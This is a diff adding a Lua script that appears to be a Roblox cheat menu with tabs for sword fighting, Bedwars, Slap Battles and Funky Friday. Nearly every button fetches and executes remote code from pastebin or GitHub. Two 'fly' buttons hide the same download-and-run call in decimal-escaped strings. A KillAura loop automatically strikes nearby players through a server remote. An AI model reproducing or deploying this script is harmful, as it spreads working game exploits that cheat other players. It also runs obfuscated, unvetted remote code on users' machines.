@@ -1,0 +1,123 @@
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+
+local Window = Library.CreateLib("ez hub all gamesV1", "BloodTheme")
+
+local Tab = Window:NewTab("keybind")
+
+local Section = Tab:NewSection("keybind F")
+
+Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
+
+	print("You just clicked the bind")end)
+
+Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
+
+	Library:ToggleUI()
+
+end)
+
+local Tab = Window:NewTab("Sword fight")
+
+local Section = Tab:NewSection("sword fight")
+
+Section:NewButton("Reach", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://pastebin.com/raw/v85uKg67", true))() end)
+
+Section:NewButton("keyboard", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end)
+
+Section:NewButton("infinity yield", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)
+
+Section:NewButton("fly", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")() end)
+
+local Tab = Window:NewTab("bedwars")
+
+local Section = Tab:NewSection("bedwars")
+
+Section:NewButton("vapeV4", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))() end)
+
+Section:NewButton("keyboard", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end)
+
+Section:NewButton("JN V3", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/JN-HH-Gaming-Pro/main/JN%20HH%20Gaming%20Pro",true))() end)
+
+local Tab = Window:NewTab("Slap battles")
+
+local Section = Tab:NewSection("Slap battles")
+
+Section:NewButton("dizzy hub(risky)", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/dizzy_hub/scripts/slap_battles.lua')))(); end)
+
+Section:NewButton("rouge hub", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Main.lua", true))() end)
+
+Section:NewButton("KillAura", "ButtonInfo", function()
+
+    print("Clicked")
+
+function isSpawned(player) if workspace:FindFirstChild(player.Name) and player.Character:FindFirstChild("HumanoidRootPart") then return true else return false end end while wait() do for i, v in pairs(game.Players:GetPlayers()) do if isSpawned(v) and v ~= game.Players.LocalPlayer and not v.Character.Head:FindFirstChild("UnoReverseCard") then if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then game:GetService("ReplicatedStorage").b:FireServer(v.Character["Right Arm"]) wait(0.1) end end end end end)
+
+Section:NewButton("ButtonText", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end)
+
+Section:NewButton("fly", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")() end)
+
+local Tab = Window:NewTab("funky friday")
+
+local Section = Tab:NewSection("funky friday")
+
+Section:NewButton("auto play (only fluxus)", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))() end)
+
+Section:NewButton("auto play (only mouse)", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/botbrostopusing/NEW-HUB/main/README.md'))() end)
+
+Section:NewButton("keyboard", "ButtonInfo", function()
+
+    print("Clicked")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end)
